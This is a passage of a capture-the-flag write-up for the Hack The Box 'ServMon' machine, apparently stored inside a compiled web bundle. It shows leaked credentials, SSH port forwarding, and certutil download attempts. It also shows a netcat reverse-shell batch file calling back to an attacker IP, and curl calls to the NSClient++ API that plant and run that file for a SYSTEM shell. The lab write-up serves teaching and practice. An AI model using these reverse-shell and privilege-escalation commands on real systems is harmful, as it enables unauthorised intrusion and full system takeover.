",(0,s.kt)("inlineCode",{parentName:"p"},"nadine:L1k3B1gBut7s@W0rk"),"."),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," automatically opened us a session but with ",(0,s.kt)("inlineCode",{parentName:"p"},"cmd.exe"),". But I prefer\nto have a powershell shell."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ssh nadine@10.10.10.184 powershell.exe\nnadine@10.10.10.184's password: \nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nTry the new cross-platform PowerShell https://aka.ms/pscore6\n\nPS C:\\Users\\Nadine>\n")),(0,s.kt)("p",null,"Let's get our user flag:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"PS C:\\Users\\Nadine> gc Desktop\\user.txt\nf9dc9b5ab530d6d295219c156662c3c9\n")),(0,s.kt)("h3",{id:"privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem"},"Privilege Escalation  through NSClient++: Nadine to NT Authority\\SYSTEM"),(0,s.kt)("p",null,"Remember of the hypothesis I made about ",(0,s.kt)("inlineCode",{parentName:"p"},"NSClient++"),". Let's read EDB-ID 46802\nagain."),(0,s.kt)("p",null,"We can use the CLI tool to display the password:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'PS C:\\Users\\Nadine> cd "C:\\Program Files\\NSClient++"\nPS C:\\Program Files\\NSClient++> .\\nscp web -- password --display\nCurrent password: ew2x6SsGTxjRwXOT\n')),(0,s.kt)("p",null,"By trying to login with the password at ",(0,s.kt)("a",{parentName:"p",href:"https://10.10.10.184:8443/index.html"},"https://10.10.10.184:8443/index.html"),"\nwe are denied."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://i.imgur.com/xOahmka.png",alt:null})),(0,s.kt)("p",null,"But if we read the config file ",(0,s.kt)("inlineCode",{parentName:"p"},'gc "c:\\program files\\nsclient++\\nsclient.ini"'),"\nwe can see something."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-ini"},'# If you want to fill this file with all available options run the following command:\n#   nscp settings --generate --add-defaults --load-all\n# If you want to activate a module and bring in all its options use:\n#   nscp settings --activate-module <MODULE NAME> --add-defaults\n# For details run: nscp settings --help\n\n; in flight - TODO\n[/settings/default]\n\n; Undocumented key\npassword = ew2x6SsGTxjRwXOT\n\n; Undocumented key\nallowed hosts = 127.0.0.1\n\n; in flight - TODO\n[/settings/NRPE/server]\n\n; Undocumented key\nssl options = no-sslv2,no-sslv3\n\n; Undocumented key\nverify mode = peer-cert\n\n; Undocumented key\ninsecure = false\n\n; in flight - TODO\n[/modules]\n\n; Undocumented key\nCheckHelpers = disabled\n\n; Undocumented key\nCheckEventLog = disabled\n\n; Undocumented key\nCheckNSCP = disabled\n\n; Undocumented key\nCheckDisk = disabled\n\n; Undocumented key\nCheckSystem = disabled\n\n; Undocumented key\nWEBServer = enabled\n\n; Undocumented key\nNRPEServer = enabled\n\n; CheckTaskSched - Check status of your scheduled jobs.\nCheckTaskSched = enabled\n\n; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA\nScheduler = enabled\n\n; CheckExternalScripts - Module used to execute external scripts\nCheckExternalScripts = enabled\n\n; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.\n[/settings/external scripts/wrappings]\n\n; Batch file - Command used for executing wrapped batch files\nbat = scripts\\\\%SCRIPT% %ARGS%\n\n; Visual basic script - Command line used for wrapped vbs scripts\nvbs = cscript.exe //T:30 //NoLogo scripts\\\\lib\\\\wrapper.vbs %SCRIPT% %ARGS%\n\n; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts\nps1 = cmd /c echo If (-Not (Test-Path "scripts\\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -\n\n; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`\n[/settings/external scripts/scripts]\n\n; Schedules - Section for the Scheduler module.\n[/settings/scheduler/schedules]\n\n; Undocumented key\nfoobar = command = foobar\n\n; External script settings - General settings for the external scripts module (CheckExternalScripts).\n[/settings/external scripts]\nallow arguments = true\n')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"allowed hosts = 127.0.0.1")," tells us we can authenticate only from localhost."),(0,s.kt)("p",null,"But as we have an SSH access we can do some local port forwarding (you can read\nabout this technique on my ",(0,s.kt)("a",{parentName:"p",href:"https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/"},"article about pivoting"),")."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ssh nadine@10.10.10.184 -L 127.0.0.1:9999:127.0.0.1:8443 -N\n")),(0,s.kt)("p",null,"We map the local port 8443 on ServMon machine to local port 9999 on our machine."),(0,s.kt)("p",null,"Now we should be able to authenticate at ",(0,s.kt)("a",{parentName:"p",href:"https://127.0.0.1:9999/"},"https://127.0.0.1:9999/")," with password\n",(0,s.kt)("inlineCode",{parentName:"p"},"ew2x6SsGTxjRwXOT"),"."),(0,s.kt)("p",null,"Now the exploit tell us to enable some modules:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"CheckExternalScripts"),(0,s.kt)("li",{parentName:"ul"},"Scheduler")),(0,s.kt)("p",null,"Now let's prepare our backdoor script: ",(0,s.kt)("inlineCode",{parentName:"p"},"cyfun.bat")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bat"},"@echo off\nc:\\temp\\nc.exe 10.10.15.26 8888 -e cmd.exe\n")),(0,s.kt)("p",null,"We can try to download the bat script with ",(0,s.kt)("a",{parentName:"p",href:"https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download"},"Certutil"),"\nand a local HTTP server."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ python -m http.server --bind 10.10.15.26\n")),(0,s.kt)("p",null,"But that's a failure:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"PS C:\\Users\\Nadine> cd C:\\temp\n\nPS C:\\temp> certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat cyfun.bat\nAt line:1 char:1\n+ certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat no ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n")),(0,s.kt)("p",null,"We can't download our script because it's blocked by an AV. So let's create is on\nthe server directly."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'PS C:\\temp> echo "@echo off" > cyfun.bat\nPS C:\\temp> echo "c:\\temp\\nc.exe 10.10.15.26 8888 -e cmd.exe" >> cyfun.bat\nPS C:\\temp> gc cyfun.bat\n@echo off\nc:\\temp\\nc.exe 10.10.15.26 8888 -e cmd.exe\n')),(0,s.kt)("p",null,"I tried to download ",(0,s.kt)("inlineCode",{parentName:"p"},"nc.exe")," with certutils but it was blocked by the AV too."),(0,s.kt)("p",null,"So I downloaded it via scp:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ scp nc.exe nadine@10.10.10.184:/temp/nc.exe\n")),(0,s.kt)("p",null,"I tried to create the RCE via the webUI as in the exploit but wasn't successful."),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("a",{parentName:"li",href:"https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts"},"https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts")),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("a",{parentName:"li",href:"https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules"},"https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules"))),(0,s.kt)("p",null,"So instead I created the task via the API:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$ curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:9999/api/v1/scripts/ext/scripts/cyfun.bat --data-binary "c:\\temp\\nc.exe 10.10.15.26 8888 -e cmd.exe"\nAdded cyfun as scripts\\cyfun.bat\n\n$ curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:9999/api/v1/queries/cyfun/commands/execute\\?time\\=1m\n{"command":"cyfun","lines":[{"message":"Command cyfun didn\'t terminate within the timeout period 60s","perf":{}}],"result":3}\n')),(0,s.kt)("p",null,"And finally got a privileged shell:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ nc -nlp 8888\nMicrosoft Windows [Version 10.0.18363.752]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\Program Files\\NSClient++>whoami\nnt authority\\system\n\nC:\\Program Files\\NSClient++>type c:\\users\\administrator\\desktop\\root.txt\n72c07cb24f21e63a855346edcd0816cb\n")))}u.isMDXComponent=!0},81709:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/servmon-bb4a057679248f0d4b806c4238af7b60.png"}}]);